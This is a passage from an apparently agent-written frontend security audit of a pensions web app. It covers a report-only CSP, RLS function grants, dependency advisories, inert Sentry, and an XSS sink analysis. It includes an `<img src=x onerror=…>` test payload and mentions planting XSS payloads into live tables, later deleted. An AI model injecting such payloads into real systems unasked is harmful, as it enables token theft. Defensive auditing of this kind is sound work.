   and `script-src 'self'` (no `'unsafe-hashes'`) forbids the inline `onload="this.media='all'"` attribute
   on that same `<link>`.

Replayed the *exact* production policy as an enforcing header against the live site:
```
$ node docs/audits/2026-08-23/a24-csp-enforce-probe.mjs
CSP violations under ENFORCEMENT: 58
 "style-src-elem <- https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans…": 1
 "script-src-attr <- inline": 1
 "font-src <- https://fonts.gstatic.com/s/inter/v20/…woff2": 4    (×7 Inter faces)
 "font-src <- https://fonts.gstatic.com/s/plusjakartasans/v12/…woff2": 6  (×8 Jakarta faces)
body font-family resolved to: Inter, sans-serif
```
Screenshot: `docs/audits/2026-08-23/a24-csp-enforced.png`.
**Impact:** the app's only XSS mitigation is decorative. Anyone who flips it to enforcing to "turn on the
CSP" will strip the brand typography from every page — including the public landing page — which is a
demo-visible regression. And because no report endpoint exists, nobody would have known in advance.
**Fix (do not apply):** add `https://fonts.googleapis.com` to `style-src`, `https://fonts.gstatic.com` to
`font-src`, and either move the font `<link>` off its inline `onload` (a `media="print"` swap can be done
from `main.jsx`) or add `'unsafe-hashes'` + the attribute hash. Add a `report-to`/`report-uri` endpoint,
watch it for a week, then flip to enforcing. `frame-ancestors 'none'`, `base-uri 'self'`,
`form-action 'self'`, `object-src 'none'` are all correct and should survive the edit unchanged.

### A24-003 · LOW · `anon` cannot read `branches` / `distributors` / `notifications` at all — the RLS policy chain hard-errors instead of returning `[]`
**Location:** `public.current_distributor_id()` grants; policies `branches_select_distributor`, `distributors_select_self`, `notifications_select_distributor`
**Confidence:** confirmed
**Primary owner:** A03 (privilege surface) / A02 (RLS matrix) — raised here because I hit it through the frontend network capture.

Postgres evaluates **all** permissive `SELECT` policies for a table, OR-ing them. Three tables carry a
policy that calls `current_distributor_id()`, and `anon` has no `EXECUTE` on it:
```
$ psql ... "SELECT p.proname, coalesce(array_to_string(p.proacl,' '),'<default>') FROM pg_proc p …
            WHERE p.proname='current_distributor_id';"
current_distributor_id|postgres|f|postgres=X/postgres authenticated=X/postgres service_role=X/postgres

$ psql ... "SELECT 'authenticated', has_function_privilege('authenticated','public.current_distributor_id()','EXECUTE')
     UNION ALL SELECT 'anon', has_function_privilege('anon',…) UNION ALL SELECT 'service_role', …;"
authenticated|t
anon|f
service_role|t

$ psql ... BEGIN; SET LOCAL ROLE anon; SET LOCAL "request.jwt.claims" = '{"role":"anon"}';
           SELECT count(*) FROM notifications;
ERROR:  permission denied for function current_distributor_id
```
Table-level `SELECT` **is** granted to `anon` on all three, so the intent is clearly "let anon ask, let RLS
return nothing". What actually happens over PostgREST:
```
$ for t in branches distributors notifications districts regions; do curl … "$SUPABASE_URL/rest/v1/$t?select=id&limit=1" -H "apikey: <anon>"; done
branches       500 {"code":"25P02", … "current transaction is aborted …"}
distributors   401 {"code":"42501", … "permission denied for function current_distributor_id"}
notifications  401 {"code":"42501", … "permission denied for function current_distributor_id"}
districts      200 [{"id":"d-buikwe"}]
regions        200 [{"id":"r-central"}]
```
**Impact today: none user-visible.** I captured every request from an unauthenticated session across six
landing routes (`/`, `/subscribers`, `/about`, `/contact`, `/claim`, `/request-access`) and the app makes
**zero** Supabase calls while logged out — so nothing in the product currently trips this. It is a latent
trap: the first logged-out feature that reads `branches` (a public coverage map, a distributor picker)
will get a hard 401/500 instead of an empty list, and the error text names an internal function.
**Fix (do not apply):** `GRANT EXECUTE ON FUNCTION public.current_distributor_id() TO anon;` (it is a
claims reader — it discloses nothing to a caller who has no claims), or make the three policies
short-circuit on `app_role` before calling it, as the agent/branch/employer policies already do.

### A24-004 · LOW · `react-router` 7.17.0 carries 5 advisories including a high; the in-range fix is one `npm update` away
**Location:** `package.json` (`react-router-dom: ^7.15.1`) → installed 7.17.0
**Confidence:** confirmed (advisories), confirmed (non-reachability)

The only vulnerable package that reaches a browser. All five advisories are unreachable in this codebase
for the reasons tabulated in §5.2 — no SSR, no RSC, no user-controlled navigation target. But the fixed
release **7.18.2 satisfies the declared `^7.15.1` range**, so this is a zero-risk, zero-decision upgrade
that is simply not being taken (`npm outdated`: `react-router-dom 7.17.0 → wanted 7.18.2`). Dependabot PR
**#35** already contains it.
**Impact:** carrying an advertised high on a browser-shipped dependency has no exploit path today, but it
guarantees the advisory shows up in every future audit and it depends on the "no user-controlled
navigation target" invariant continuing to hold — an invariant nothing enforces.
**Fix (do not apply):** merge Dependabot #35, or `npm update react-router-dom` (→ 7.18.2). The same PR
takes `vite` 6.4.2 → 6.4.3 (closes GHSA-fx2h-pf6j-xcff) and `concurrently` 9.2.1 → 9.2.4 (closes the
`shell-quote` critical).

### A24-005 · LOW · `@sentry/react` is a devDependency but is imported by production runtime code
**Location:** `package.json` devDependencies · `src/main.jsx:6`, `src/components/ErrorBoundary.jsx:20`
**Confidence:** confirmed
```
$ python3 -c "…package.json…"
@sentry/node    -> dependencies     ^10.57.0
@sentry/react   -> devDependencies  ^10.57.0     ← imported from src/
$ grep -rn "@sentry/react" src | grep -v test
src/main.jsx:6:import * as Sentry from '@sentry/react';
src/components/ErrorBoundary.jsx:20:      import('@sentry/react').then((Sentry) =>
```
`@sentry/node` is correctly a runtime dependency (used by `server/index.ts`); its browser twin is not.
The build survives today only because Vercel installs devDependencies by default **and** the DSN is unset,
so the static import is tree-shaken. Both crutches are incidental.
**Impact:** any build performed with `--omit=dev` / `NODE_ENV=production npm ci` — the exact pattern
`render.yaml` already had to work around with `NPM_CONFIG_PRODUCTION=false` — fails to resolve
`@sentry/react` and the frontend build breaks. It is a latent build-time failure, not a runtime one.
**Fix (do not apply):** move `@sentry/react` into `dependencies` alongside `@sentry/node`.

### A24-006 · LOW · Dependabot backlog: 12 open dependency PRs, oldest 76 days; 39 packages behind
**Location:** `.github/dependabot.yml` (config is fine) · GitHub PRs #13–#35
**Confidence:** confirmed — full `gh pr list` output and `npm outdated` inventory in §6.

The automation works and its output is being ignored. Ten PRs have been open since 2026-06-09. Every
runtime package is behind even its in-range `wanted` version, including three that each close a
currently-reported advisory (`react-router-dom`, `vite`, `concurrently`).
**Impact:** the audit's entire high/critical list is, in practice, one merge of PR #35 away from being
materially shorter. Left alone, each weekly cycle widens the gap and the grouped PR grows harder to
review (it is already 27 updates).
**Fix (do not apply):** merge #35 first (grouped minor/patch, closes all three in-range advisories), then
triage the 12 majors individually. Consider `open-pull-requests-limit` and a CI gate that fails on a
*reachable* high rather than on any high, so the signal stays meaningful.

### A24-007 · INFO · The single raw-HTML sink is correctly escaped — and that is the only thing standing between the app and token theft
**Location:** `src/signup/contribution/insurancePolicyCertificate.js:37-44, 439`
**Confidence:** confirmed

I enumerated all 37 `${…}` interpolations in the certificate template and classified every one:
constants (`INDIGO`, `INK`, `SUBTLE`), `escapeHtml()` outputs (`product`, `holder`, `member`,
`premiumLbl`, `cadence`, beneficiary `name`/`rel`), or formatter outputs that structurally cannot echo
their input — `formatDate()` returns `'—'` for anything unparseable (`src/utils/date.js:57`) and
`formatUGX()` returns `'UGX 0'`/`'—'` for non-finite input (`src/utils/currency.js:41`). `share` is
`Number()`-coerced. Line 442 assigns to `document.title`, a text property, not markup. **No gap.**

Why it matters anyway: the destination is `window.open('')`, whose `about:blank` document is
**same-origin with the opener** — I measured `popupOrigin: "http://localhost:5173"` and
`canReadOpenerLocalStorage: "yes"` on both Chromium and WebKit. A single future field interpolated
without `escapeHtml` is therefore not a cosmetic bug, it is a direct read of
`localStorage['upensions_token']`. The escaping here is hand-rolled and has no test asserting it
(the unit test asserts markup shape, not escaping of hostile input).
**Suggestion (do not apply):** add a unit test that feeds `<img src=x onerror=…>` into every string field
of `buildPolicyCertificateHtml` and asserts the output contains no `<img`/`<script`/`onerror`. That
converts a convention into a guarantee before A24-001's fix makes this code path live again.

### A24-008 · INFO · `xlsx` security assessment — clean, with one bounded DoS caveat
**Location:** `package.json` · `src/utils/xlsx.js`
**Confidence:** confirmed

The baseline is correct that npm reports **no advisory against `xlsx`**, and I am not inventing one.
Assessed on its own merits (§5.3): version 0.20.3 is the maintained SheetJS CDN build, past the
prototype-pollution (CVE-2023-30533) and ReDoS (CVE-2024-22363) fixes; the lockfile pins a `sha512`
integrity hash; `parseSheet` applies a 5 MB size cap, a `sheetRows: 50_000` parse cap, and an
extension + MIME allow-list *before* handing bytes to the parser; and formula injection on write is
**not reachable** because `aoa_to_sheet` emits string-typed cells (measured, §5.3).
The one residual: `parseSheet` runs on the **main thread**, so a 5 MB workbook — legitimate or crafted —
blocks the tab for the duration. Distributor settlement uploads and employer bulk-onboard both use it.
**Suggestion (do not apply):** if a rep ever reports a frozen tab on upload, move `parseSheet` into a Web
Worker. Tighten `MAX_UPLOAD_BYTES` toward the real template size (a few KB) rather than 5 MB.

### A24-009 · INFO · Sentry is wired end to end but completely inert in production
**Location:** `src/main.jsx:29-38` · `vercel.json:11` (`connect-src … https://*.sentry.io`)
**Confidence:** confirmed

`VITE_SENTRY_DSN` is unset in the Vercel build, so `Sentry.init` never runs — and Vite's static
replacement turns the whole guard into dead code, which Rollup then uses to drop the import entirely.
Grep across all six production entry chunks: **0 occurrences of `sentry`, 0 of `captureException`.** Zero
network requests to any Sentry host in any of the three captured sessions.
Consequences worth knowing: (a) the careful PII scrubber in `src/utils/sentryScrub.js` has never run in
production; (b) `ErrorBoundary`'s Sentry forwarding is a no-op, so the only record of a frontend crash is
`console.error`; (c) the CSP allow-lists `https://*.sentry.io` in `connect-src` for traffic that does not
exist. Not a defect for a demo tool — but "we have error reporting" is not currently true.

### A24-010 · INFO · Transient PostgREST `25P02` 500s observed mid-audit — NOT a product defect; recorded so nobody re-derives it
**Location:** live PostgREST, project `ilkhfnoyxlxwqadebnkp`
**Confidence:** confirmed observation, **refuted** as a product defect

During my first captures (≈08:05–08:15 UTC) the live PostgREST returned
`{"code":"25P02","message":"current transaction is aborted…"}` on **8–30 %** of *authenticated* reads,
across unrelated tables. It hit real UI surfaces: the admin notification bell
(`HEAD /rest/v1/notifications?…` 500) and the subscriber dashboard's single data call
(`GET /rest/v1/subscribers?select=*,subscriber_balances(*),…` 500).

I chased the obvious hypothesis — that an `anon` read tripping A24-003's `42501` was poisoning pooled
connections — and **disproved it under controlled conditions**:
```
STEP 0 clean baseline (40 authenticated reads): 500s = 0
STEP 1 fire ONE anon SELECT on public.branches:  -> HTTP 401 {"code":"42501", …}
STEP 2 immediately: 40 authenticated reads: 500s = 0
STEP 3 fire 10 more anon SELECTs on public.branches
STEP 4 immediately: 40 authenticated reads: 500s = 0
```
And a later clean sweep across roles and tables was completely green (0 non-200 in 160 requests), as was
a six-iteration reload of the subscriber dashboard (`4×200` Supabase calls per load, 0 failures).
**Conclusion:** the burst correlates with the audit's own concurrent load — 27 agents hammering one free-
tier project — and cleared on its own. **I am not raising it as a defect.** Downstream agents who catch a
`25P02` should re-measure after a cool-down before writing it up.

### A24-011 · LOW · `xlsx` resolves from `cdn.sheetjs.com`, not the npm registry
**Location:** `package.json` (`"xlsx": "https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz"`)
**Confidence:** confirmed
```
node_modules/xlsx  "resolved": "https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz",
                   "integrity": "sha512-oLDq3jw7AcLqKWH2AhCpVTZl8mf6X2YReP+Neh0SJUzV/BdZYjth94tG5toiMB1PPrYtxOCfaoUCkvtuH+3AJA=="
```
This is the *right* call for security (the npm `xlsx` package is abandoned at 0.18.5 and carries unfixed
CVEs), and integrity **is** pinned so tampering fails the install. The cost is availability: `npm ci` — on
Vercel, on Render, and in the `test.yml` CI job — needs `cdn.sheetjs.com` reachable, and a registry mirror
or an offline cache will not have it.
**Impact:** a CDN outage or a corporate proxy that only whitelists `registry.npmjs.org` breaks every build
and deploy, with an error that looks nothing like a dependency problem.
**Fix (do not apply):** vendor the tarball into the repo and resolve it by relative path, or mirror it to
a registry the org controls. If neither, document the dependency in the deploy runbook so the failure mode
is recognisable.

---

## Traceability

Every numbered check in the A24 spec, mapped to exactly one disposition. Sub-checks are listed so the
coverage claim is auditable.

| # | Check | Disposition |
|---|---|---|
| **1** | **Token in `localStorage`; CSP report-only; enumerate realistic theft paths** | **FINDING A24-002** (+ A24-007) |
| 1a | `upensions_token` key + all read/write sites located | PASS |
| 1b | Six realistic theft paths enumerated and each rated (§1) | PASS |
| 1c | CSP enforcement status + would-it-break-if-enforced test | FINDING A24-002 |
| **2** | **Unsafe render sweep + XSS end to end on the 4 public-write tables** | **PASS** (no XSS; A24-007 info) |
| 2a | `dangerouslySetInnerHTML` / `innerHTML` / `eval` / `new Function` / `srcDoc` / `javascript:` sweep over 610 files | PASS (1 sink, `document.write`) |
| 2b | Payloads planted in `access_requests` via `:3001` | PASS (2 rows, stored verbatim) |
| 2c | Payloads planted in `nominee_claims` via `:3001` | PASS (2 rows, stored verbatim) |
| 2d | Render side confirmed — desktop admin, both panels | PASS (0 executions, escaped) |
| 2e | Render side confirmed — mobile admin, both routes | PASS (0 executions, escaped) |
| 2f | `contact_submissions` / `agent_referrals` render path | PASS (no render path exists) |
| 2g | The one `document.write` sink audited for escaping completeness (37 interpolations) | FINDING A24-007 |
| **3** | **Open redirect, token in URL/query, referrer leakage** | **PASS** |
| 3a | Every `navigate()` / `<Link to>` / `window.location` sink traced, incl. the DB-sourced `row.href` | PASS |
| 3b | Token in URL / query / `console.*` | PASS (0 sites) |
| 3c | Referrer policy measured against production | PASS (origin only, no cookie, no auth) |
| **4** | **Third-party surface from an AUTHENTICATED session (Playwright network log)** | **PASS** (A24-009 info) |
| 4a | Anon landing capture, 6 routes | PASS |
| 4b | Authenticated subscriber capture | PASS |
| 4c | Authenticated distributor + Carto map-tile capture | PASS |
| 4d | Sentry reachability from the browser | FINDING A24-009 |
| **5** | **npm audit triage — reachability; xlsx on merits; react-router open redirect** | **FINDING A24-004** (+ A24-008, A24-011) |
| 5a | 3 criticals traced to devDependencies pruned before runtime | PASS (0 reachable) |
| 5b | 12 highs traced; 11 dev-only, 1 browser-shipped | FINDING A24-004 |
| 5c | `xlsx` merits: version, integrity, caps, formula-injection-on-write tested | FINDING A24-008, A24-011 |
| 5d | react-router open-redirect pattern reachability | PASS (not reachable) |
| **6** | **Dependency freshness and Dependabot backlog** | **FINDING A24-006** |
| 6a | Dependabot config + open-PR backlog enumerated | FINDING A24-006 |
| 6b | `npm outdated` inventory; in-range advisory fixes identified | FINDING A24-006 |
| **7** | **No secret reachable from the client (counts only, G2)** | **PASS — 0** |
| 7a | Local `dist/` scan (328 assets) | PASS (1 anon JWT, 0 secrets) |
| 7b | Live production bundle scan (6 entry chunks) | PASS (1 anon JWT, 0 secrets) |
| 7c | Every `import.meta.env` reference checked for wrong `VITE_` prefixing | FINDING A24-005 (dep classification, not a secret leak) |
| **8** | **Clickjacking, postMessage listeners, service-worker scope** | **PASS** |
| 8a | `X-Frame-Options` / `frame-ancestors` on app + API hosts | PASS |
| 8b | `postMessage` listeners and origin checks | PASS (1 SW listener, literal compare, no `window` listener) |
| 8c | Service-worker scope, cross-origin exclusion, `/api/*` exclusion, cache caps, prod headers | PASS |

**Also raised outside the numbered checks:** A24-001 (critical, found while auditing the `document.write`
sink under check 2g), A24-003 (low, found via the check-4 network capture), A24-010 (info, recorded to
prevent a downstream false positive).

---

## Artifacts written by A24 (all under `docs/audits/2026-08-23/`)
```
24-frontend-security.md            ← this report
a24-plant-xss.mjs                  payload planter (rows since deleted)
a24-render-probe.mjs               desktop+mobile admin render probe + network capture
a24-desktop-probe.mjs              focused desktop admin sidebar probe
a24-thirdparty-probe.mjs           anon / subscriber / distributor network capture
a24-prod-referer-probe.mjs         production referrer + third-party header capture
a24-csp-enforce-probe.mjs          replays the report-only CSP as enforcing against prod
a24-winopen-probe.mjs              window.open('noopener') return-value proof, 2 engines
a24-cert-e2e.mjs                   end-to-end repro of the broken certificate download
a24-recheck-subscriber.mjs         6× subscriber dashboard reload, 500-rate re-measure
a24-network.json  a24-thirdparty.json
a24-desktop-admin.png  a24-desktop-Access-requests.png  a24-desktop-Nominee-claims.png
a24-mobile-admin.png   a24-certificate-broken.png       a24-csp-enforced.png
```
**Fixture data:** 4 rows were created (2 `access_requests`, 2 `nominee_claims`) and **all 4 were deleted
and the deletion verified** — see §2.4. No other live data was created, modified or deleted.
